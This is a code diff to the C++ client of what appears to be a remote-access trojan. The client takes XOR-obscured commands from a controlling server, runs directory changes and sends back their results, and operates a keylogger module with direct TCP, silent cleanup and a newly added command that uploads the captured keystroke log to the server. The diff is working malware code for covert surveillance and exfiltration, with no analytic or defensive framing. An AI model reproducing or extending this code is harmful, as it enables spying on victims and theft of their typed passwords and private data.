@@ -58,8 +58,8 @@ INT Connexion::main()
     {
         command = recvSafe(); //Recv safe and decrypt xor
         
-        //wcout << "command recv: " << command << "<----" <<endl;
-        //wcout << "command len: " << command.length() << endl;
+        wcout << "command recv: " << command << "<----" <<endl;
+        wcout << "command len: " << command.length() << endl;
         
 
         if(command.find(L"is_life?") != wstring::npos)
@@ -82,6 +82,7 @@ INT Connexion::main()
             else if(command.substr(0,2)==L"cd")
             {
             //Change directory
+                wcout << "\n\nchange directoy: \n" << endl;
                 if(changeDirectory(command.substr(3)))
                 {
                     result.push_back("[-] Error when changing folder.");
@@ -89,6 +90,7 @@ INT Connexion::main()
                 }
                 else
                 {
+                    wcout << "Change directory: " << GetLastError() << endl;
                     result.push_back(ConvertWideToUtf8(getPath())); 
                     wcout << getPath() << endl;  
                 }
@@ -167,7 +169,7 @@ INT Connexion::main()
                 {
                     wcout << "directcp" << endl;
                     error_codes = a_keylogger->directTcp();
-                    sendSafe(L"MOD_KEYLOGGER:"SPLIT + int_to_wstring(error_codes));
+                    sendSafe(L"MOD_KEYLOGGER:" SPLIT + int_to_wstring(error_codes));
                 } 
 
 
@@ -204,6 +206,12 @@ INT Connexion::main()
                     error_codes =  a_keylogger->silenciousClean();
                 
                     sendSafe(L"MOD_KEYLOGGER:clean_silencious:" SPLIT + int_to_wstring(error_codes));
+                }
+                
+                else if(command.substr(14, 8) == L"download")
+                {
+                    wcout << "go to download file !" << endl;
+                    a_keylogger->sendLogFile();
                 }
             }
 
@@ -263,7 +271,6 @@ VOID Connexion::sendCommandSafe(vector<string> result_of_command, BOOL encrypted
 Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
     INT status=0;
     INT i=0;
-    INT size_all_result_of_command = 0;
     wstring request;
 
     for(i=0;i< result_of_command.size(); i++)
@@ -278,7 +285,6 @@ Once the function is finished send "\r\n" to signal to the server that the clien
             request = ConvertUtf8ToWide(result_of_command[i]);
         }
         send(a_sock, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
-        wcout << "send request baby" << endl;
         Sleep(100);   
     }
         
